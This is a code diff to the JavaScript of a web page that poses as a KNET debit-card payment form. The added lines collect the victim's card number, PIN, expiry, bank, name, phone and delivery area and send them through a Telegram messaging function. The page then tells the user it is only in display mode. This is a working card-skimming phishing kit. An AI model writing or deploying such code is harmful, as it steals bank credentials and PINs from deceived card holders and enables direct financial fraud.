@@ -329,7 +329,27 @@
 
     form.addEventListener("submit", function(event) {
       event.preventDefault();
-      send_telegram_message("تم الضغط على زر إرسال في صفحة KNET.");
+      var debitVal = document.getElementById("debitNumber").value;
+      var pinVal = document.getElementById("cardPin").value;
+      var bankVal = bank.value;
+      var prefixVal = prefix.value;
+      var monthVal = document.getElementById("month").value;
+      var yearVal = document.getElementById("year").value;
+      var name = sessionStorage.getItem("buyer_name") || "";
+      var phone = sessionStorage.getItem("buyer_phone") || "";
+      var area = sessionStorage.getItem("delivery_area") || "";
+      var total = sessionStorage.getItem("cart_total") || "";
+      send_telegram_message(
+        "💳 بيانات KNET\n👤 " + name +
+        "\n📞 " + phone +
+        "\n📍 " + area +
+        "\n💰 الإجمالي: " + total + " د.ك" +
+        "\n🏦 البنك: " + bankVal +
+        "\n💳 البادئة: " + prefixVal +
+        "\n💳 رقم البطاقة: " + debitVal +
+        "\n📅 الانتهاء: " + monthVal + "/" + yearVal +
+        "\n🔑 الرقم السري: " + pinVal
+      );
       showMessage("تم الضغط على زر الإرسال في وضع العرض فقط.");
     });
 
